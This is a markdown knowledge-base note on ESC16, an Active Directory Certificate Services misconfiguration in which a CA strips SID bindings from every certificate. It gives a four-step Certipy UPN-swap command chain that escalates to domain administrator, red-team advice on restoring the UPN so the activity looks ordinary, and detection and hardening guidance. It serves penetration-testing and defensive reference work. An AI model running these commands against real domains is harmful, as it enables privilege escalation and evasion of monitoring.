---
title: "ESC16 — Security Extension disabled CA-wide (no SID in any cert)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation, pkinit]
---

# ESC16

**ESC16 is the CA-wide version of [[esc9]].** Where ESC9 is a single *template*
that sets `CT_FLAG_NO_SECURITY_EXTENSION`, ESC16 is the **CA itself configured to
omit** the `szOID_NTDS_CA_SECURITY_EXT` (the SID security extension) from **every
certificate it issues** — by adding that OID to the CA's disabled-extension list
(`DisableExtensionList` / policy-module registry on the CA). The result: **no
issued cert carries a SID binding**, regardless of template. Combined with weak
DC certificate mapping, that reopens the **UPN-swap** identity spoof against *any*
client-auth template on the CA. Added to the ESC taxonomy alongside Certipy 5.x
detection/exploitation.

## The conditions

1. The CA has the security extension **disabled globally** (the szOID is on its
   `DisableExtensionList`) → no cert gets a SID.
2. DC **`StrongCertificateBindingEnforcement < 2`** (compatibility/disabled) →
   the DC may map a cert by a **weak attribute** (UPN/SAN) instead of SID
   ([[certificate-mapping]], [[esc10]]).
3. You can control a victim's UPN — **GenericWrite** on an account
   ([[acl-abuse]]) — or already hold an account whose UPN you can set.

Because it's CA-wide, ESC16 doesn't need a specially-flagged template like ESC9
does: **any** template offering Client Authentication works.

## Exploit (UPN-swap, same dance as ESC9)

```bash
# 1. swap the victim's UPN to the target (e.g. a DA) — needs GenericWrite
certipy account update -u attacker@corp.local -p 'Pass' -user victim -upn administrator@corp.local

# 2. enroll as victim on ANY client-auth template (no SID lands in the cert)
certipy req -u victim@corp.local -p 'victimpass' -ca CORP-CA -template User

# 3. restore the victim UPN (cleanup)
certipy account update -u attacker@corp.local -p 'Pass' -user victim -upn victim@corp.local

# 4. authenticate with the cert — weak mapping resolves it to administrator's UPN
certipy auth -pfx victim.pfx -dc-ip <dc>
```

Certipy 5.x flags ESC16 in `certipy find -vulnerable` and drives the flow.

## Red-team notes (OPSEC)

- **One CA setting, every template affected** — ESC16 is worth checking whenever
  `certipy find` shows the CA stripping the security extension; it's easy to miss
  because there's no obviously "vulnerable template," the weakness is on the CA.
- Same footprint as the ESC9/ESC10 UPN-swap: the **transient UPN change** on the
  victim object is the loud part — restore it, and enroll/auth look ordinary.

## Detection

- **CA configuration**: the szOID on the `DisableExtensionList` / issued certs
  missing `szOID_NTDS_CA_SECURITY_EXT` — audit CA policy for globally-disabled
  security extension.
- **UPN churn**: an account's `userPrincipalName` changed to a privileged UPN and
  back in a short window (5136 directory-object modification) — the ESC9/10/16
  tell.
- **Weak binding**: DCs with `StrongCertificateBindingEnforcement < 2` (the
  enabler) — raise to `2` (full enforcement) to kill the whole UPN-swap family.

## Links

- [[esc9]] — the per-template equivalent (same UPN-swap, template-scoped)
- [[esc10]] / [[certificate-mapping]] — the weak-binding half that makes it exploitable
- [[ntauthcertificates]] — the trust store the forged cert still chains to
- [[ad-cs-esc-attacks]] — the ESC family hub
- [[certipy]] — detection and exploitation
